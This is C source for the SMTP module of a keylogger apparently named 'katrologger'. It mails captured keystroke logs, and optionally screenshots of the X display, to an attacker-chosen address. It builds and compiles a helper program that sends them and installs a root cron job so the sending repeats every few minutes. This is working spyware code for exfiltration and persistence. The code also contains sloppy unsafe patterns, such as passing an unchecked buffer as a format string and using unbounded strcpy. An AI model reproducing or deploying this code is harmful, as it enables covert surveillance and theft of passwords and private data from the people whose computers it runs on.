#include "smtp_mail.h"

void smtp_mail(int argc, char **argv){

  FILE *write_smtp_file = fopen(smtp_log, "w");
  FILE *append_smtp_file = fopen(smtp_log, "a");
  FILE *fd_cron_file;
  int port;
  int flag_screenshot = 0;
  int secure_smtp;
  char send_smtp[1024] = "";
  char smtp_buffer[2048] = "";
  char smtp_url[256] = "";
  char mail_pass[256] = "";
  char mail_from[256] = "";
  char mail_rcpt[256] = "";
  char upload_file[256] = "";
  char time[24] = "";
  char display[8] = "";
  const char* x_user;
  const char* x_display;

  for (int arg = 0; arg < argc; arg++) {

    if ( (strcmp(argv[arg], "--smtp-url") ) == 0 ) {
          arg++;
          strncat(smtp_url, argv[arg], 250);
          secure_smtp=0;
     } else if ( (strcmp(argv[arg], "--smtps-url") ) == 0 ) {
          arg++;
          strncat(smtp_url, argv[arg], 250);
          secure_smtp=1;
     }  else if ( (strcmp(argv[arg], "--port") ) == 0 ) {
          arg++;
          port=atoi(argv[arg]);
     } else if ( (strcmp(argv[arg], "--pass") ) == 0) {
          arg++;
          strncat(mail_pass, argv[arg], 250);
      } else if ( (strcmp(argv[arg], "--mail-from") ) == 0) {
          arg++;
          strncat(mail_from, argv[arg], 250);
      } else if ( (strcmp(argv[arg], "--mail-rcpt") ) == 0) {
          arg++;
          strncat(mail_rcpt, argv[arg], 250);
      } else if ( (strcmp(argv[arg], "--smtp-file") ) == 0) {
          arg++;
          strcpy(outfile, argv[arg]);
          FILE *path_smtpfile = fopen(outfile, "a");
          if (path_smtpfile == NULL)
          {
            printf("katrologger: specified path does not exist: %s\nkatrologger: try 'katrologger --help'\n", outfile);
            exit(1);
          }
      } else if ( (strcmp(argv[arg], "--time") ) == 0) {
          arg++;
            if ( (atoi(argv[arg]) >= 1) && (atoi(argv[arg]) <= 60) ) {
                  strncat(time, argv[arg], 24);
            } else {
              system("clear");
                  printf("Error Time Incorrect: %s\nExemple: --time 1-60 Minutes \n", argv[arg]);
              exit(1);
          }
      } else if ( (strcmp(argv[arg], "--screen") ) == 0) {
        arg++;

        if (argv[arg] == NULL) {
          x_display = getenv("DISPLAY");
          strcpy(display, x_display); // Default display session
        } else {
          strcpy(display, argv[arg]);
        }

        Display *check_xorg = XOpenDisplay(display);
        if(check_xorg == NULL){
          fprintf(stderr, "Given display cannot be found, exiting: %s\n", display);
          exit(1);
        } else{
          flag_screenshot = 1;
        }
          x_user = getenv("XAUTHORITY");
      }
  }

quickmail_initialize();
quickmail mailobj = quickmail_create(mail_from, "Keylogger successfully initialized");
quickmail_add_to(mailobj, mail_rcpt);
const char* errmsg;

if (secure_smtp == 1) {
  if ((errmsg = quickmail_send_secure(mailobj, smtp_url, port, mail_from, mail_pass)) != NULL)
    {
        fprintf(stderr, "Error sending e-mail: %s\n", errmsg);
        exit(1);
    } else {
        strncat(send_smtp, "quickmail_send_secure", 1024);
        fprintf(write_smtp_file, "● Emailing Keyboard Entries (running)\n\n");
        fclose(write_smtp_file);
        quickmail_fsave(mailobj, append_smtp_file);
        quickmail_destroy(mailobj);
    }
} else if (secure_smtp == 0) {
  if ((errmsg = quickmail_send(mailobj, smtp_url, port, mail_from, mail_pass)) != NULL)
    {
        fprintf(stderr, "Error sending e-mail: %s\n\n", errmsg);
        exit(1);
    } else {
        strncat(send_smtp, "quickmail_send", 1024);
        fprintf(write_smtp_file, "● Emailing Keyboard Entries (running)\n");
        fclose(write_smtp_file);
        quickmail_fsave(mailobj, append_smtp_file);
        quickmail_destroy(mailobj);
    }
}

fprintf(append_smtp_file, "URL: %s\n", smtp_url);
fprintf(append_smtp_file, "Port: %d\n", port);
fprintf(append_smtp_file, "Time intervall: %s minutes\n", time);
fprintf(append_smtp_file, "Cronjob: yes\n");
fclose(append_smtp_file);

FILE *mail_job = fopen("/root/.katrologger/run/mailjob.c" ,"w");
fprintf(mail_job, "#include <quickmail.h>\n");
fprintf(mail_job, "int main(){\n");
fprintf(mail_job, "quickmail_initialize();\n");
fprintf(mail_job, "quickmail mailobj = quickmail_create(\"%s\", \"Katrologger\");\n", mail_from);
fprintf(mail_job, "quickmail_add_to(mailobj, \"%s\");\n", mail_rcpt);
fprintf(mail_job, "quickmail_add_attachment_file(mailobj, \"%s\", NULL);\n", outfile);
if (flag_screenshot == 1) {
fprintf(mail_job, "quickmail_add_attachment_file(mailobj, \"/root/.katrologger/screenshots/screenshot.png\", NULL);\n");
}
fprintf(mail_job, "%s(mailobj, \"%s\", %d, \"%s\", \"%s\");\n", send_smtp, smtp_url, port, mail_from, mail_pass);
fprintf(mail_job, "quickmail_destroy(mailobj);\n}\n");
fclose(mail_job);
system("gcc /root/.katrologger/run/mailjob.c -o /root/.katrologger/run/mailjob -lquickmail -w");

if( (fd_cron_file = fopen(cron_file, "w") ) != NULL) {

    if (flag_screenshot == 1) {
      snprintf(smtp_buffer, sizeof(smtp_buffer), "*/%s * * * * DISPLAY=%s; XAUTHORITY=%s; /root/.katrologger/run/screenshot %s; sleep 3; /root/.katrologger/run/mailjob\n", time, display, x_user, display);
    } else {
      snprintf(smtp_buffer, sizeof(smtp_buffer), "*/%s * * * * /root/.katrologger/run/mailjob\n", time);
    }
    fprintf(fd_cron_file, smtp_buffer);
    fclose(fd_cron_file);
    chown(cron_file, 0, 108);
    system("crontab -u cronjob /var/spool/cron/cronjob");
  }
}
